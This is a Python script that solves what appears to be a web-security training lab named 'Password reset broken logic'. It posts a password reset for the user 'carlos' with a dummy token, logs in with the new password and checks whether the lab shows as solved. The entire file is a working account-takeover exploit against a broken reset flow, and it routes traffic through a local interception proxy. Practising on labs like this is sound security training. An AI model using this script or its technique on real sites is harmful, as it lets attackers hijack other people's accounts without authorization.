# Password reset broken logic

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def reset_password(s, url):
	reset_path = url + '/forgot-password'
	time.sleep(1)
	reset_data = {'username': 'carlos', 'new-password-1': 'password123!', 'new-password-2': 'password123!', 'temp-forgot-password-token': 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'}
	print("\n[+] Trying to reset Carlos's password...")
	r = s.post(reset_path, data=reset_data, allow_redirects=False)
	time.sleep(1)
	if r.status_code != 302:
		print('[-] Exploit failed to reset the password <!>')
		sys.exit(1)
	print('[+] Password changed to arbitrary password !')
	return r

def connect_as_carlos(s, url):
	login_path = url + '/login'
	data_login = {'username': 'carlos', 'password': 'password123!'}
	print('\n[+] Trying to connect to the application as Carlos with the new password...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	account_path = url + '/my-account'
	print('[+] Navigating to "%s"' % account_path)
	r = s.get(account_path)
	if 'Your username is: carlos' in r.text:
		print('[+] Logged in as Carlos !')
		return r
	else:
		print('[-] Exploit failed to connect as Carlos <!>')

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Password reset broken logic')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to reset Carlos password...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = reset_password(s, url)
			s.cookies.clear()
			time.sleep(1)
			r = connect_as_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
